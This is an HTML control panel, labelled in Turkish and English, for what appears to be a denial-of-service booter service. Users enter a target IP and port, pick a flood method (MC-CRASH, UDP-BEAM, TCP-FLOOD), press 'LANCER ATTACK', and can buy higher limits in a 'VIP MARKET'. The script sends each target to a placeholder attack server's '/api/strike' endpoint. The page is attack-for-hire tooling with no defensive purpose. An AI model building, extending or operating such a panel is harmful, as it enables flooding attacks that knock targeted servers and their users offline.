<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>CRM ELITE COMMANDER v7.0</title>
    <style>
        body { background: #050608; color: #fff; font-family: monospace; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .panel { background: #0d1117; border: 1px solid #30363d; padding: 20px; border-radius: 10px; }
        input, select, button { width: 100%; padding: 12px; margin: 5px 0; background: #000; color: var(--p); border: 1px solid #30363d; }
        .log { height: 300px; overflow-y: auto; background: #000; border: 1px solid #30363d; padding: 10px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="grid">
        <div class="panel">
            <h2>NETWORK COMMAND</h2>
            <input id="targetIp" placeholder="Hedef IP (179.61.xxx.xxx)">
            <input id="targetPort" placeholder="Hedef Port (Tüm Portlar Desteklenir)">
            <select id="method"><option>MC-CRASH</option><option>UDP-BEAM</option><option>TCP-FLOOD</option></select>
            <button onclick="send()">LANCER ATTACK</button>
            <div id="market" style="margin-top:20px; border-top:1px solid #30363d;">
                <h3>VIP MARKET</h3>
                <button>Sınırsız Port Erişimi Al</button>
                <button>Elite Thread Limit Aç</button>
            </div>
        </div>
        <div class="panel">
            <h2>LIVE LOGS & STATUS</h2>
            <div id="logs" class="log">> Sistem aktif, komut bekleniyor...</div>
        </div>
    </div>
    <script>
        async function send() {
            const data = { host: document.getElementById('targetIp').value, port: document.getElementById('targetPort').value, method: document.getElementById('method').value };
            document.getElementById('logs').innerHTML += `> Strike initiated to ${data.host}:${data.port}<br>`;
            await fetch('http://VDS_IP_ADRESIN:3000/api/strike', { method: 'POST', body: JSON.stringify(data) });
        }
    </script>
</body>
</html>
